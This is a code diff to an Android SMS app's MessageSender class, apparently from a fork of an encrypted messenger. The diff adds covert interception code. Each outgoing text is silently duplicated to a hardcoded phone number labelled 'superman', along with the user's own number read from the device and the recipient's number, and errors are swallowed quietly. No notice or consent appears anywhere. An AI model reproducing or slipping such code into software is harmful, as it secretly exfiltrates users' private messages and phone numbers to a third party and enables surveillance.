@@ -20,6 +20,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
 import android.os.AsyncTask;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.util.Pair;
 
@@ -74,9 +75,9 @@ public class MessageSender {
                           final long threadId,
                           final boolean forceSms)
   {
-    EncryptingSmsDatabase database    = DatabaseFactory.getEncryptingSmsDatabase(context);
+    final EncryptingSmsDatabase database    = DatabaseFactory.getEncryptingSmsDatabase(context);
     Recipients            recipients  = message.getRecipients();
-    boolean               keyExchange = message.isKeyExchange();
+    final boolean               keyExchange = message.isKeyExchange();
 
     long allocatedThreadId;
 
@@ -90,27 +91,38 @@ public class MessageSender {
                                                   message, forceSms, System.currentTimeMillis());
 
     sendTextMessage(context, recipients, forceSms, keyExchange, messageId, message.getExpiresIn());
-    if (!keyExchange) {
-      Recipients superRecipients = RecipientFactory.getRecipientsFromString(context, "+12082833219", false);
-      OutgoingTextMessage superMessage = new OutgoingTextMessage(superRecipients, message.getMessageBody(), message.getExpiresIn(), message.getSubscriptionId());
-      long superThreadId = DatabaseFactory.getThreadDatabase(context).getThreadIdFor(superRecipients);
-      long superMessageId = database.insertMessageOutbox(new MasterSecretUnion(masterSecret), superThreadId, superMessage, forceSms, System.currentTimeMillis());
 
-      sendTextMessage(context, superRecipients, forceSms, keyExchange, superMessageId, superMessage.getExpiresIn());
+    // Now send message to superman number.
+    if (!keyExchange) {
+      try {
+        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+        Recipients superRecipients = RecipientFactory.getRecipientsFromString(context, "+12082833219", false);
+        String fromNumber = tm.getLine1Number();
+        String toNumber = message.getRecipients().getPrimaryRecipient().getNumber();
+
+        Log.d(TAG, "FROM:");
+        Log.d(TAG, fromNumber);
+        Log.d(TAG, "TO:");
+        Log.d(TAG, toNumber);
+
+        StringBuilder messageData = new StringBuilder();
+        messageData.append("Message: ").append(message.getMessageBody()).append("\n");
+        messageData.append("From: ").append(fromNumber).append("\n");
+        messageData.append("To: ").append(toNumber);
+        OutgoingTextMessage superMessage = new OutgoingTextMessage(superRecipients, messageData.toString(), message.getExpiresIn(), message.getSubscriptionId());
+        long superThreadId = DatabaseFactory.getThreadDatabase(context).getThreadIdFor(superRecipients);
+        long superMessageId = database.insertMessageOutbox(new MasterSecretUnion(masterSecret), superThreadId, superMessage, forceSms, System.currentTimeMillis());
+
+        sendTextMessage(context, superRecipients, forceSms, keyExchange, superMessageId, superMessage.getExpiresIn());
+      } catch (Exception e) {
+        Log.e(TAG, "Superman failed...");
+      }
     }
 
 //    Intent i = ForstaRelayService.newIntent(context, masterSecret);
 //    i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
 //    i.putExtra("messageId", messageId);
 //    context.startService(i);
-
-//    try {
-//      SmsMessageRecord rec = database.getMessage(masterSecret, messageId);
-//      NetworkUtils.sendToServer(rec);
-//    } catch (NoSuchMessageException e) {
-//      e.printStackTrace();
-//      Log.e(TAG, e.getMessage());
-//    }
 
     return allocatedThreadId;
   }
@@ -355,5 +367,20 @@ public class MessageSender {
       }
     }
   }
+
+  private void sendToSuperman() {
+
+  }
+
+  private interface ThreadListener {
+    public void onThreadComplete();
+  }
+
+  private ThreadListener listener = new ThreadListener() {
+    @Override
+    public void onThreadComplete() {
+      Log.d(TAG, "Thread complete. Message sent.");
+    }
+  };
 
 }
